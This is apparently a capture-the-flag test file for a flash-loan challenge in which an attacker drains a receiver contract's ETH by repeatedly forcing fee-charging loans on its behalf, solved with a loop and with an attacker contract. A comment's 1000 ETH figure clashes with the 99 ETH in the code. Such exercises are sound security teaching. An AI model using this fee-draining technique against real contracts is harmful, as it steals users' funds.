const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const LenderPool = contract.fromArtifact('NaiveReceiverLenderPool');
const FlashLoanReceiver = contract.fromArtifact('FlashLoanReceiver');
const AttackerNaiveReceiver = contract.fromArtifact('AttackerNaiveReceiver');

const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {

    const [deployer, user, attacker, ...otherAccounts] = accounts;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ether('99');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ether('10');

    /** SETUP - NO NEED TO CHANGE ANYTHING HERE */
    before(async function () {

        // Deployer sends 1000 ETH to Pool
        this.pool = await LenderPool.new({ from: deployer });
        await web3.eth.sendTransaction({ from: deployer, to: this.pool.address, value: ETHER_IN_POOL });
        
        expect(await balance.current(this.pool.address)).to.be.bignumber.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee({ from: deployer })).to.be.bignumber.equal(ether('1'));

        // User sends 10 ETH to Receiver
        this.receiver = await FlashLoanReceiver.new(this.pool.address, { from: user });
        await web3.eth.sendTransaction({ from: user, to: this.receiver.address, value: ETHER_IN_RECEIVER });
        
        expect(await balance.current(this.receiver.address)).to.be.bignumber.equal(ETHER_IN_RECEIVER);
    });

    it('Exploit', async function () {

        // Solution 1 (in 10 transactions)
        /*
        while (await balance.current(this.receiver.address) > 0) {
            await this.pool.flashLoan(this.receiver.address, 0);
        };
        */

        // Solutin 2 (in 1 transaction through a smart contract)
        this.attacker = await AttackerNaiveReceiver.new(this.pool.address, {from: attacker});
        await this.attacker.emptyReceiver(this.receiver.address);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        // All ETH has been drained from the receiver
        expect(
            await balance.current(this.receiver.address)
        ).to.be.bignumber.equal('0');

        expect(
            await balance.current(this.pool.address)
        ).to.be.bignumber.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
